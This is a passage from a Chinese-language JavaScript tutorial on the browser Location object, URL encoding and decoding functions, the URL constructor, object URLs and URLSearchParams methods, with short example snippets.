\"http://user:passwd@www.example.com:4097\" \u8fd9\u4e9b\u5c5e\u6027\u91cc\u9762\uff0c\u53ea\u6709 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53ef\u5199\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5bf9 Location.href \u5199\u5165\u65b0\u7684 URL \u5730\u5740\uff0c\u6d4f\u89c8\u5668\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u8fd9\u4e2a\u65b0\u5730\u5740\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7f51\u5740 document . location . href = 'http://www.example.com' ; \u8fd9\u4e2a\u7279\u6027\u5e38\u5e38\u7528\u4e8e\u8ba9\u7f51\u9875\u81ea\u52a8\u6eda\u52a8\u5230\u65b0\u7684\u951a\u70b9\u3002 1 2 3 document . location . href = '#top' ; // \u7b49\u540c\u4e8e document . location . hash = '#top' ; \u76f4\u63a5\u6539\u5199 location \uff0c\u76f8\u5f53\u4e8e\u5199\u5165 href \u5c5e\u6027\u3002 1 2 3 document . location = 'http://www.example.com' ; // \u7b49\u540c\u4e8e document . location . href = 'http://www.example.com' ; \u53e6\u5916\uff0c Location.href \u5c5e\u6027\u662f\u6d4f\u89c8\u5668\u552f\u4e00\u5141\u8bb8\u8de8\u57df\u5199\u5165\u7684\u5c5e\u6027\uff0c\u5373\u975e\u540c\u6e90\u7684\u7a97\u53e3\u53ef\u4ee5\u6539\u5199\u53e6\u4e00\u4e2a\u7a97\u53e3\uff08\u6bd4\u5982\u5b50\u7a97\u53e3\u4e0e\u7236\u7a97\u53e3\uff09\u7684 Location.href \u5c5e\u6027\uff0c\u5bfc\u81f4\u540e\u8005\u7684\u7f51\u5740\u8df3\u8f6c\u3002 Location \u7684\u5176\u4ed6\u5c5e\u6027\u90fd\u4e0d\u5141\u8bb8\u8de8\u57df\u5199\u5165\u3002 \u65b9\u6cd5 \u00b6 \uff081\uff09Location.assign() assign \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u5f97\u6d4f\u89c8\u5668\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u7684 URL\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 URL \u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u62a5\u9519\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7684\u7f51\u5740 document . location . assign ( 'http://www.example.com' ) \uff082\uff09Location.replace() replace \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u5f97\u6d4f\u89c8\u5668\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u7684 URL\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 URL \u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u62a5\u9519\u3002 \u5b83\u4e0e assign \u65b9\u6cd5\u7684\u5dee\u5f02\u5728\u4e8e\uff0c replace \u4f1a\u5728\u6d4f\u89c8\u5668\u7684\u6d4f\u89c8\u5386\u53f2 History \u91cc\u9762\u5220\u9664\u5f53\u524d\u7f51\u5740\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\u540e\u9000\u6309\u94ae\u5c31\u65e0\u6cd5\u56de\u5230\u5f53\u524d\u7f51\u9875\u4e86\uff0c\u76f8\u5f53\u4e8e\u5728\u6d4f\u89c8\u5386\u53f2\u91cc\u9762\uff0c\u4f7f\u7528\u65b0\u7684 URL \u66ff\u6362\u4e86\u8001\u7684 URL\u3002\u5b83\u7684\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u5f53\u811a\u672c\u53d1\u73b0\u5f53\u524d\u662f\u79fb\u52a8\u8bbe\u5907\u65f6\uff0c\u5c31\u7acb\u523b\u8df3\u8f6c\u5230\u79fb\u52a8\u7248\u7f51\u9875\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7684\u7f51\u5740 document . location . replace ( 'http://www.example.com' ) \uff083\uff09Location.reload() reload \u65b9\u6cd5\u4f7f\u5f97\u6d4f\u89c8\u5668\u91cd\u65b0\u52a0\u8f7d\u5f53\u524d\u7f51\u5740\uff0c\u76f8\u5f53\u4e8e\u6309\u4e0b\u6d4f\u89c8\u5668\u7684\u5237\u65b0\u6309\u94ae\u3002 \u5b83\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u53c2\u6570\u4e3a true \uff0c\u6d4f\u89c8\u5668\u5c06\u5411\u670d\u52a1\u5668\u91cd\u65b0\u8bf7\u6c42\u8fd9\u4e2a\u7f51\u9875\uff0c\u5e76\u4e14\u91cd\u65b0\u52a0\u8f7d\u540e\uff0c\u7f51\u9875\u5c06\u6eda\u52a8\u5230\u5934\u90e8\uff08\u5373 scrollTop === 0 \uff09\u3002\u5982\u679c\u53c2\u6570\u662f false \u6216\u4e3a\u7a7a\uff0c\u6d4f\u89c8\u5668\u5c06\u4ece\u672c\u5730\u7f13\u5b58\u91cd\u65b0\u52a0\u8f7d\u8be5\u7f51\u9875\uff0c\u5e76\u4e14\u91cd\u65b0\u52a0\u8f7d\u540e\uff0c\u7f51\u9875\u7684\u89c6\u53e3\u4f4d\u7f6e\u662f\u91cd\u65b0\u52a0\u8f7d\u524d\u7684\u4f4d\u7f6e\u3002 1 2 // \u5411\u670d\u52a1\u5668\u91cd\u65b0\u8bf7\u6c42\u5f53\u524d\u7f51\u5740 window . location . reload ( true ); \uff084\uff09Location.toString() toString \u65b9\u6cd5\u8fd4\u56de\u6574\u4e2a URL \u5b57\u7b26\u4e32\uff0c\u76f8\u5f53\u4e8e\u8bfb\u53d6 Location.href \u5c5e\u6027\u3002 URL \u7684\u7f16\u7801\u548c\u89e3\u7801 \u00b6 \u7f51\u9875\u7684 URL \u53ea\u80fd\u5305\u542b\u5408\u6cd5\u7684\u5b57\u7b26\u3002\u5408\u6cd5\u5b57\u7b26\u5206\u6210\u4e24\u7c7b\u3002 URL \u5143\u5b57\u7b26\uff1a\u5206\u53f7\uff08 ; \uff09\uff0c\u9017\u53f7\uff08 , \uff09\uff0c\u659c\u6760\uff08 / \uff09\uff0c\u95ee\u53f7\uff08 ? \uff09\uff0c\u5192\u53f7\uff08 : \uff09\uff0cat\uff08 @ \uff09\uff0c & \uff0c\u7b49\u53f7\uff08 = \uff09\uff0c\u52a0\u53f7\uff08 + \uff09\uff0c\u7f8e\u5143\u7b26\u53f7\uff08 $ \uff09\uff0c\u4e95\u53f7\uff08 # \uff09 \u8bed\u4e49\u5b57\u7b26\uff1a a-z \uff0c A-Z \uff0c 0-9 \uff0c\u8fde\u8bcd\u53f7\uff08 - \uff09\uff0c\u4e0b\u5212\u7ebf\uff08 _ \uff09\uff0c\u70b9\uff08 . \uff09\uff0c\u611f\u53f9\u53f7\uff08 ! \uff09\uff0c\u6ce2\u6d6a\u7ebf\uff08 ~ \uff09\uff0c\u661f\u53f7\uff08 * \uff09\uff0c\u5355\u5f15\u53f7\uff08 ' \uff09\uff0c\u5706\u62ec\u53f7\uff08 () \uff09 \u9664\u4e86\u4ee5\u4e0a\u5b57\u7b26\uff0c\u5176\u4ed6\u5b57\u7b26\u51fa\u73b0\u5728 URL \u4e4b\u4e2d\u90fd\u5fc5\u987b\u8f6c\u4e49\uff0c\u89c4\u5219\u662f\u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u7684\u9ed8\u8ba4\u7f16\u7801\uff0c\u5c06\u6bcf\u4e2a\u5b57\u8282\u8f6c\u4e3a\u767e\u5206\u53f7\uff08 % \uff09\u52a0\u4e0a\u4e24\u4e2a\u5927\u5199\u7684\u5341\u516d\u8fdb\u5236\u5b57\u6bcd\u3002 \u6bd4\u5982\uff0cUTF-8 \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c http://www.example.com/q=\u6625\u8282 \u8fd9\u4e2a URL \u4e4b\u4e2d\uff0c\u6c49\u5b57\u201c\u6625\u8282\u201d\u4e0d\u662f URL \u7684\u5408\u6cd5\u5b57\u7b26\uff0c\u6240\u4ee5\u88ab\u6d4f\u89c8\u5668\u81ea\u52a8\u8f6c\u6210 http://www.example.com/q=%E6%98%A5%E8%8A%82 \u3002\u5176\u4e2d\uff0c\u201c\u6625\u201d\u8f6c\u6210\u4e86 %E6%98%A5 \uff0c\u201c\u8282\u201d\u8f6c\u6210\u4e86 %E8%8A%82 \u3002\u8fd9\u662f\u56e0\u4e3a\u201c\u6625\u201d\u548c\u201c\u8282\u201d\u7684 UTF-8 \u7f16\u7801\u5206\u522b\u662f E6 98 A5 \u548c E8 8A 82 \uff0c\u5c06\u6bcf\u4e2a\u5b57\u8282\u524d\u9762\u52a0\u4e0a\u767e\u5206\u53f7\uff0c\u5c31\u6784\u6210\u4e86 URL \u7f16\u7801\u3002 JavaScript \u63d0\u4f9b\u56db\u4e2a URL \u7684\u7f16\u7801/\u89e3\u7801\u65b9\u6cd5\u3002 encodeURI() encodeURIComponent() decodeURI() decodeURIComponent() encodeURI() \u00b6 encodeURI() \u65b9\u6cd5\u7528\u4e8e\u8f6c\u7801\u6574\u4e2a URL\u3002\u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u6574\u4e2a URL\u3002\u5b83\u4f1a\u5c06\u5143\u5b57\u7b26\u548c\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u90fd\u8fdb\u884c\u8f6c\u4e49\u3002 1 2 encodeURI ( 'http://www.example.com/q=\u6625\u8282' ) // \"http://www.example.com/q=%E6%98%A5%E8%8A%82\" encodeURIComponent() \u00b6 encodeURIComponent() \u65b9\u6cd5\u7528\u4e8e\u8f6c\u7801 URL \u7684\u7ec4\u6210\u90e8\u5206\uff0c\u4f1a\u8f6c\u7801\u9664\u4e86\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5373\u5143\u5b57\u7b26\u4e5f\u4f1a\u88ab\u8f6c\u7801\u3002\u6240\u4ee5\uff0c\u5b83\u4e0d\u80fd\u7528\u4e8e\u8f6c\u7801\u6574\u4e2a URL\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f URL \u7684\u7247\u6bb5\u3002 1 2 3 4 encodeURIComponent ( '\u6625\u8282' ) // \"%E6%98%A5%E8%8A%82\" encodeURIComponent ( 'http://www.example.com/q=\u6625\u8282' ) // \"http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c encodeURIComponent() \u4f1a\u8fde URL \u5143\u5b57\u7b26\u4e00\u8d77\u8f6c\u4e49\uff0c\u6240\u4ee5\u5982\u679c\u8f6c\u7801\u6574\u4e2a URL \u5c31\u4f1a\u51fa\u9519\u3002 decodeURI() \u00b6 decodeURI() \u65b9\u6cd5\u7528\u4e8e\u6574\u4e2a URL \u7684\u89e3\u7801\u3002\u5b83\u662f encodeURI() \u65b9\u6cd5\u7684\u9006\u8fd0\u7b97\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u8f6c\u7801\u540e\u7684 URL\u3002 1 2 decodeURI ( 'http://www.example.com/q=%E6%98%A5%E8%8A%82' ) // \"http://www.example.com/q=\u6625\u8282\" decodeURIComponent() \u00b6 decodeURIComponent() \u7528\u4e8eURL \u7247\u6bb5\u7684\u89e3\u7801\u3002\u5b83\u662f encodeURIComponent() \u65b9\u6cd5\u7684\u9006\u8fd0\u7b97\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u8f6c\u7801\u540e\u7684 URL \u7247\u6bb5\u3002 1 2 decodeURIComponent ( '%E6%98%A5%E8%8A%82' ) // \"\u6625\u8282\" URL \u63a5\u53e3 \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b URL() \u63a5\u53e3\uff0c\u5b83\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u6784\u9020\u3001\u89e3\u6790\u548c\u7f16\u7801 URL\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7 window.URL \u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u3002 \u6784\u9020\u51fd\u6570 \u00b6 URL() \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210 URL \u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u8868\u793a URL \u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5408\u6cd5\u7684 URL\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 var url = new URL ( 'http://www.example.com/index.html' ); url . href // \"http://www.example.com/index.html\" \u4e0a\u9762\u793a\u4f8b\u751f\u6210\u4e86\u4e00\u4e2a URL \u5b9e\u4f8b\uff0c\u7528\u6765\u4ee3\u8868\u6307\u5b9a\u7684\u7f51\u5740\u3002 \u9664\u4e86\u5b57\u7b26\u4e32\uff0c URL() \u7684\u53c2\u6570\u4e5f\u53ef\u4ee5\u662f\u53e6\u4e00\u4e2a URL \u5b9e\u4f8b\u3002\u8fd9\u65f6\uff0c URL() \u4f1a\u81ea\u52a8\u8bfb\u53d6\u8be5\u5b9e\u4f8b\u7684 href \u5c5e\u6027\uff0c\u4f5c\u4e3a\u5b9e\u9645\u53c2\u6570\u3002 \u5982\u679c URL \u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48\u9700\u8981\u8868\u793a\u7edd\u5bf9\u8def\u5f84\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u4e3a\u8ba1\u7b97\u57fa\u51c6\u3002 1 2 3 4 5 6 7 8 9 10 11 var url1 = new URL ( 'index.html' , 'http://example.com' ); url1 . href // \"http://example.com/index.html\" var url2 = new URL ( 'page2.html' , 'http://example.com/page1.html' ); url2 . href // \"http://example.com/page2.html\" var url3 = new URL ( '..' , 'http://example.com/a/b.html' ) url3 . href // \"http://example.com/\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fd4\u56de\u7684 URL \u5b9e\u4f8b\u7684\u8def\u5f84\u90fd\u662f\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u57fa\u7840\u4e0a\uff0c\u5207\u6362\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7684\u3002\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f .. \uff0c\u8868\u793a\u4e0a\u5c42\u8def\u5f84\u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 URL \u5b9e\u4f8b\u7684\u5c5e\u6027\u4e0e Location \u5bf9\u8c61\u7684\u5c5e\u6027\u57fa\u672c\u4e00\u81f4\uff0c\u8fd4\u56de\u5f53\u524d URL \u7684\u4fe1\u606f\u3002 URL.href\uff1a\u8fd4\u56de\u6574\u4e2a URL URL.protocol\uff1a\u8fd4\u56de\u534f\u8bae\uff0c\u4ee5\u5192\u53f7 : \u7ed3\u5c3e URL.hostname\uff1a\u8fd4\u56de\u57df\u540d URL.host\uff1a\u8fd4\u56de\u57df\u540d\u4e0e\u7aef\u53e3\uff0c\u5305\u542b : \u53f7\uff0c\u9ed8\u8ba4\u768480\u548c443\u7aef\u53e3\u4f1a\u7701\u7565 URL.port\uff1a\u8fd4\u56de\u7aef\u53e3 URL.origin\uff1a\u8fd4\u56de\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3 URL.pathname\uff1a\u8fd4\u56de\u8def\u5f84\uff0c\u4ee5\u659c\u6760 / \u5f00\u5934 URL.search\uff1a\u8fd4\u56de\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u4ee5\u95ee\u53f7 ? \u5f00\u5934 URL.searchParams\uff1a\u8fd4\u56de\u4e00\u4e2a URLSearchParams \u5b9e\u4f8b\uff0c\u8be5\u5c5e\u6027\u662f Location \u5bf9\u8c61\u6ca1\u6709\u7684 URL.hash\uff1a\u8fd4\u56de\u7247\u6bb5\u8bc6\u522b\u7b26\uff0c\u4ee5\u4e95\u53f7 # \u5f00\u5934 URL.password\uff1a\u8fd4\u56de\u57df\u540d\u524d\u9762\u7684\u5bc6\u7801 URL.username\uff1a\u8fd4\u56de\u57df\u540d\u524d\u9762\u7684\u7528\u6237\u540d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var url = new URL ( 'http://user:passwd@www.example.com:4097/path/a.html?x=111#part1' ); url . href // \"http://user:passwd@www.example.com:4097/path/a.html?x=111#part1\" url . protocol // \"http:\" url . hostname // \"www.example.com\" url . host // \"www.example.com:4097\" url . port // \"4097\" url . origin // \"http://www.example.com:4097\" url . pathname // \"/path/a.html\" url . search // \"?x=111\" url . searchParams // URLSearchParams {} url . hash // \"#part1\" url . password // \"passwd\" url . username // \"user\" \u8fd9\u4e9b\u5c5e\u6027\u91cc\u9762\uff0c\u53ea\u6709 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53ef\u5199\uff0c\u5e76\u4e14\u4f1a\u7acb\u5373\u751f\u6548\u3002 1 2 3 4 5 6 7 var url = new URL ( 'http://example.com/index.html#part1' ); url . pathname = 'index2.html' ; url . href // \"http://example.com/index2.html#part1\" url . hash = '#part2' ; url . href // \"http://example.com/index2.html#part2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8 URL \u5b9e\u4f8b\u7684 pathname \u5c5e\u6027\u548c hash \u5c5e\u6027\uff0c\u90fd\u4f1a\u5b9e\u65f6\u53cd\u6620\u5728 URL \u5b9e\u4f8b\u5f53\u4e2d\u3002 \u9759\u6001\u65b9\u6cd5 \u00b6 \uff081\uff09URL.createObjectURL() URL.createObjectURL() \u65b9\u6cd5\u7528\u6765\u4e3a\u4e0a\u4f20/\u4e0b\u8f7d\u7684\u6587\u4ef6\u3001\u6d41\u5a92\u4f53\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86 File \u5bf9\u8c61\u6216 Blob \u5bf9\u8c61\u7684 URL\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"display\"/> // <input // type=\"file\" // id=\"fileElem\" // multiple // accept=\"image/*\" // onchange=\"handleFiles(this.files)\" // > var div = document . getElementById ( 'display' ); function handleFiles ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var img = document . createElement ( 'img' ); img . src = window . URL . createObjectURL ( files [ i ]); div . appendChild ( img ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c URL.createObjectURL() \u65b9\u6cd5\u7528\u6765\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL \u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a <img> \u5143\u7d20\u7684\u56fe\u7247\u6765\u6e90\u3002 \u8be5\u65b9\u6cd5\u751f\u6210\u7684 URL \u5c31\u50cf\u4e0b\u9762\u7684\u6837\u5b50\u3002 1 blob : http : //localhost/c745ef73-ece9-46da-8f66-ebes574789b1 \u6ce8\u610f\uff0c\u6bcf\u6b21\u4f7f\u7528 URL.createObjectURL() \u65b9\u6cd5\uff0c\u90fd\u4f1a\u5728\u5185\u5b58\u91cc\u9762\u751f\u6210\u4e00\u4e2a URL \u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u518d\u9700\u8981\u8be5\u65b9\u6cd5\u751f\u6210\u7684 URL \u5b57\u7b26\u4e32\uff0c\u4e3a\u4e86\u8282\u7701\u5185\u5b58\uff0c\u53ef\u4ee5\u4f7f\u7528 URL.revokeObjectURL() \u65b9\u6cd5\u91ca\u653e\u8fd9\u4e2a\u5b9e\u4f8b\u3002 \uff082\uff09URL.revokeObjectURL() URL.revokeObjectURL() \u65b9\u6cd5\u7528\u6765\u91ca\u653e URL.createObjectURL() \u65b9\u6cd5\u751f\u6210\u7684 URL \u5b9e\u4f8b\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f URL.createObjectURL() \u65b9\u6cd5\u8fd4\u56de\u7684 URL \u5b57\u7b26\u4e32\u3002 \u4e0b\u9762\u4e3a\u4e0a\u4e00\u6bb5\u7684\u793a\u4f8b\u52a0\u4e0a URL.revokeObjectURL() \u3002 1 2 3 4 5 6 7 8 9 10 11 12 var div = document . getElementById ( 'display' ); function handleFiles ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var img = document . createElement ( 'img' ); img . src = window . URL . createObjectURL ( files [ i ]); div . appendChild ( img ); img . onload = function () { window . URL . revokeObjectURL ( this . src ); } } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u4ee5\u540e\uff0c\u4e3a\u672c\u5730\u6587\u4ef6\u751f\u6210\u7684 URL \u5b57\u7b26\u4e32\u5c31\u6ca1\u7528\u4e86\uff0c\u4e8e\u662f\u53ef\u4ee5\u5728 img.onload \u56de\u8c03\u51fd\u6570\u91cc\u9762\uff0c\u901a\u8fc7 URL.revokeObjectURL() \u65b9\u6cd5\u5378\u8f7d\u8fd9\u4e2a URL \u5b9e\u4f8b\u3002 URLSearchParams \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 URLSearchParams \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u6784\u9020\u3001\u89e3\u6790\u548c\u5904\u7406 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u5373 URL \u95ee\u53f7\u540e\u9762\u7684\u90e8\u5206\uff09\u3002 \u5b83\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210\u5b9e\u4f8b\u3002\u53c2\u6570\u53ef\u4ee5\u4e3a\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u8d77\u9996\u7684\u95ee\u53f7 ? \u6709\u6ca1\u6709\u90fd\u884c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u5e94\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6570\u7ec4\u6216\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 // \u65b9\u6cd5\u4e00\uff1a\u4f20\u5165\u5b57\u7b26\u4e32 var params = new URLSearchParams ( '?foo=1&bar=2' ); // \u7b49\u540c\u4e8e var params = new URLSearchParams ( document . location . search ); // \u65b9\u6cd5\u4e8c\uff1a\u4f20\u5165\u6570\u7ec4 var params = new URLSearchParams ([[ 'foo' , 1 ], [ 'bar' , 2 ]]); // \u65b9\u6cd5\u4e09\uff1a\u4f20\u5165\u5bf9\u8c61 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); URLSearchParams \u4f1a\u5bf9\u67e5\u8be2\u5b57\u7b26\u4e32\u81ea\u52a8\u7f16\u7801\u3002 1 2 var params = new URLSearchParams ({ 'foo' : '\u4f60\u597d' }); params . toString () // \"foo=%E4%BD%A0%E5%A5%BD\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foo \u7684\u503c\u662f\u6c49\u5b57\uff0c URLSearchParams \u5bf9\u5176\u81ea\u52a8\u8fdb\u884c URL \u7f16\u7801\u3002 \u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001\u8868\u5355\u6570\u636e\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 URLSearchParams \u5b9e\u4f8b\u4f5c\u4e3a\u8868\u5355\u6570\u636e\u3002 1 2 3 4 5 const params = new URLSearchParams ({ foo : 1 , bar : 2 }); fetch ( 'https://example.com/api' , { method : 'POST' , body : params }). then (...) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c fetch \u547d\u4ee4\u5411\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 URLSearchParams \u5b9e\u4f8b\u3002 URLSearchParams \u53ef\u4ee5\u4e0e URL() \u63a5\u53e3\u7ed3\u5408\u4f7f\u7528\u3002 1 2 var url = new URL ( window . location ); var foo = url . searchParams . get ( 'foo' ) || 'somedefault' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cURL \u5b9e\u4f8b\u7684 searchParams \u5c5e\u6027\u5c31\u662f\u4e00\u4e2a URLSearchParams \u5b9e\u4f8b\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 URLSearchParams \u63a5\u53e3\u7684 get \u65b9\u6cd5\u3002 URLSearchParams \u5b9e\u4f8b\u6709\u904d\u5386\u5668\u63a5\u53e3\uff0c\u53ef\u4ee5\u7528 for...of \u5faa\u73af\u904d\u5386\uff08\u8be6\u89c1\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u7684\u300aIterator\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 7 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); for ( var p of params ) { console . log ( p [ 0 ] + ': ' + p [ 1 ]); } // foo: 1 // bar: 2 URLSearchParams \u6ca1\u6709\u5b9e\u4f8b\u5c5e\u6027\uff0c\u53ea\u6709\u5b9e\u4f8b\u65b9\u6cd5\u3002 URLSearchParams.toString() \u00b6 toString \u65b9\u6cd5\u8fd4\u56de\u5b9e\u4f8b\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 var url = new URL ( 'https://example.com?foo=1&bar=2' ); var params = new URLSearchParams ( url . search ); params . toString () // \"foo=1&bar=2' \u90a3\u4e48\u9700\u8981\u5b57\u7b26\u4e32\u7684\u573a\u5408\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002 1 2 var params = new URLSearchParams ({ version : 2.0 }); window . location . href = location . pathname + '?' + params ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c location.href \u8d4b\u503c\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 params \u5bf9\u8c61\u3002\u8fd9\u65f6\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002 URLSearchParams.append() \u00b6 append() \u65b9\u6cd5\u7528\u6765\u8ffd\u52a0\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u952e\u503c\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . append ( 'baz' , 3 ); params . toString () // \"foo=1&bar=2&baz=3\" append() \u65b9\u6cd5\u4e0d\u4f1a\u8bc6\u522b\u662f\u5426\u952e\u540d\u5df2\u7ecf\u5b58\u5728\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . append ( 'foo' , 3 ); params . toString () // \"foo=1&bar=2&foo=3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762 foo \u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u4f46\u662f append \u4f9d\u7136\u4f1a\u8ffd\u52a0\u4e00\u4e2a\u540c\u540d\u952e\u3002 URLSearchParams.delete() \u00b6 delete() \u65b9\u6cd5\u7528\u6765\u5220\u9664\u6307\u5b9a\u7684\u67e5\u8be2\u53c2\u6570\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . delete ( 'bar' ); params . toString () // \"foo=1\" URLSearchParams.has() \u00b6 has() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67e5\u8be2\u5b57\u7b26\u4e32\u662f\u5426\u5305\u542b\u6307\u5b9a\u7684\u952e\u540d\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . has ( 'bar' ) // true params . has ( 'baz' ) // false URLSearchParams.set() \u00b6 set() \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u952e\u503c\u3002 